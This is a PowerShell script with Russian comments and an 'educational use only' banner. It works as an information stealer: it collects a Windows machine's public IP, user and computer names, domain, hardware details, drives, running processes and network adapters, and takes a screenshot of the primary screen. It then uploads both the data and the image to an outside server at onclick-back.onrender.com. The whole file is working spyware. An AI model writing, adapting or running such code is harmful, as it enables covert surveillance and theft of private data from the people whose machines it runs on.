# ⚠️ EDUCATIONAL USE ONLY

# Получение системной информации
$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$domain = $env:USERDOMAIN
$arch = $env:PROCESSOR_ARCHITECTURE
$osinfo = Get-CimInstance Win32_OperatingSystem
$os = $osinfo.Caption
$version = $osinfo.Version
$ram = [math]::Round($osinfo.TotalVisibleMemorySize / 1MB, 2)
$cpu = (Get-CimInstance Win32_Processor).Name
$drives = Get-PSDrive -PSProvider FileSystem | Select Name, Used, Free

# Список процессов
$processes = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue

# Сетевые адаптеры
$netAdapters = Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed

# Снимок экрана
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$imgPath = \"$env:TEMP\\screen.jpg\"
$bitmap.Save($imgPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# Формирование JSON-данных
$data = @{
  ip = $ip
  username = $user
  computer = $computer
  domain = $domain
  os = $os
  version = $version
  architecture = $arch
  cpu = $cpu
  ram = \"$ram GB\"
  drives = $drives
  netAdapters = $netAdapters
  processes = $processes[0..20]  # Ограничим вывод
  timestamp = (Get-Date).ToString(\"s\")
}

# Отправка JSON
try {
  Invoke-RestMethod -Uri \"https://onclick-back.onrender.com/report\" `
    -Method POST `
    -Body ($data | ConvertTo-Json -Depth 6) `
    -ContentType \"application/json\"
  Write-Output \"✅ JSON sent\"
} catch {
  Write-Warning \"❌ Failed to send JSON: $_\"
}

# Отправка скриншота (мультичасть)
try {
  $fileBytes = [System.IO.File]::ReadAllBytes($imgPath)
  $form = @{
    file = New-Object System.Net.Http.ByteArrayContent($fileBytes)
  }
  $form.file.Headers.Add(\"Content-Type\", \"image/jpeg\")
  $client = New-Object System.Net.Http.HttpClient
  $content = New-Object System.Net.Http.MultipartFormDataContent
  $content.Add($form.file, \"screenshot\", \"screen.jpg\")
  $response = $client.PostAsync(\"https://onclick-back.onrender.com/screenshot\", $content).Result
  $responseContent = $response.Content.ReadAsStringAsync().Result
  Write-Output \"🖼️ Screenshot upload response: $responseContent\"
} catch {
  Write-Warning \"❌ Failed to upload screenshot: $_\"
}
